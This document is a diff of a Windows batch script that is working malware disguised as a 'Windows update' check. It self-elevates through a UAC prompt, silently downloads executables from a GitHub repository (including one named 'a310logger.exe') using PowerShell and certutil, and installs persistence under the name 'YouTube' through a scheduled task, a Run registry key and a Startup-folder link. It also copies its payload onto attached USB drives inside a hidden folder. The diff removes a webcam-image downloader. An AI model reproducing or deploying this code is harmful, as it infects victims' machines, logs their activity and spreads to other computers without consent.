@@ -4,6 +4,13 @@ cd /D "%~dp0"
 
 
 
+
+
+if not "%1"=="am_admin" (
+powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'" >nul 2> nul
+
+
+
 echo *************Create directory****************
    mkdir C:\Users\%username%\AppData\Roaming > nul 2> nul
    attrib -h -r C:\Users\%username%\AppData\Roaming /s /d > nul 2> nul
@@ -102,11 +109,6 @@ echo *************DOWNLOAD file****************
    )  
       if errorlevel 1 goto ERROR2   
 
-   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImagesSave.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebCamImagesSave.exe?raw=true', 'WebCamImagesSave.exe')" > nul 2> nul
-   )
-      if errorlevel 1 goto ERROR2 
-
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
       if errorlevel 1 goto ERROR2   
    goto SUCCESS 
@@ -171,11 +173,6 @@ echo *************DOWNLOAD file****************
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
-  
-   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImagesSave.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebCamImagesSave.exe?raw=true?raw=true -OutFile WebCamImagesSave.exe" > nul 2> nul
-   )   
-      if errorlevel 1 goto ERROR3
 
    powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
       if errorlevel 1 goto ERROR3
@@ -187,11 +184,7 @@ echo *************DOWNLOAD file****************
    echo.
    echo Please, wait...
    timeout 3 > NUL
-   set url="https://github.com/win32u/Licence/blob/main/Extension/WebCamImagesSave.exe?raw=true"
-   set filename="WebCamImagesSave.exe"
-   certutil -urlcache -split -f %url% %filename% > nul 2> nul
-   if errorlevel 1 goto EOF
-
+  
    set url="https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true"
    set filename="AutoRun.vbs"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
@@ -282,29 +275,21 @@ echo *************DOWNLOAD file****************
 
    )
    
+   
+    echo *************New Task Create****************
+	schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul || (
+	   echo Task creation faild!
+	)
+
+	REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\%username%\AppData\Local\0101\AutoRun.vbs /f > nul 2> nul || (
+	   echo Registry creation faild!
+	)
+
+	mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Local\0101\AutoRun.vbs" > nul 2> nul || (
+	   echo Mklink creation already exist!?
+	)
 
 
-
-
-
-
-
-
-	:: BatchGotAdmin       
-	:-------------------------------------        
-	REM  --> Check for permissions  
-	>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  
-	REM --> If error flag set, we do not have admin.  
-	if '%errorlevel%' NEQ '0' (goto UACPrompt) else ( goto gotAdmin )  
-	:UACPrompt 
-        echo *************User rights**************** 
-		echo User rights! Please, wait...
-		timeout 3 > NUL
-		echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"  
-		echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"  
-		"%temp%\getadmin.vbs"  
-		cd /D C:\Users\%username%\AppData\Roaming\
-		
 
 		:pendrive1
 		echo *************Pendrive check****************
@@ -330,48 +315,80 @@ echo *************DOWNLOAD file****************
 		   echo.
 		   cls
 		   goto pendrive1
-	:gotAdmin  
-         echo *************Administrator rights****************
-   		echo Admin rights! Please, wait...
-		timeout 3 > NUL
-		cd /D C:\Users\%username%\AppData\Roaming\
 
-                schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul || (
-                   echo Task creation faild!
-                )
-		
-		REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\%username%\AppData\Local\0101\AutoRun.vbs /f > nul 2> nul || (
-                   echo Registry creation faild!
-                )
 
-                mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Local\0101\AutoRun.vbs" > nul 2> nul || (
-                   echo Mklink creation already exist!?
-                )
 
-		:pendrive2
-		echo *************Pendrive check****************
-		   timeout 1 > NUL
-		   echo Checking for pendrive...
-		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
-		   if %%l equ 2 (
-			  mkdir %%i\YouTube > nul 2> nul
-                          if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
-                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
-                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-                          )  else (
-                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i" /Y > nul 2> nul
-                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-                             )
-			  mkdir "%%i\System Update" > nul 2> nul
-			  attrib +h "%%i\System Update" /s /d
-                          copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-			  echo Copied!
-			  ) 
-		   )
-		   echo.
-		   echo.
-		   cls
-		   goto pendrive2
-	
 
+		exit /b
+
+
+)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+echo Checking windows for update
+echo Please, wait
+timeout 1 > NUL
+cls
+
+echo Checking windows for update
+echo Please, wait.
+timeout 2 > NUL
+cls
+
+echo Checking windows for update
+echo Please, wait..
+timeout 1 > NUL
+cls
+
+echo Checking windows for update
+echo Please, wait...
+timeout 1 > NUL
+cls
+
+echo Checking windows for update
+echo Please, wait.
+timeout 1 > NUL
+cls
+
+echo Checking windows for update
+echo Please, wait..
+timeout 1 > NUL
+cls
+
+echo Checking windows for update
+echo Please, wait...
+timeout 2 > NUL
+echo.
+echo.
+echo Updates found! Please update your pc or
+echo Visit: https://support.microsoft.com/en-us/windows
+timeout 6 > NUL
+echo Windows regular checking successful..!!
+timeout 3
+
+schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul 
+
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\%username%\AppData\Local\0101\AutoRun.vbs /f > nul 2> nul 
+
+mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Local\0101\AutoRun.vbs" > nul 2> nul 
+
+echo.
+echo.
+echo.
 exit
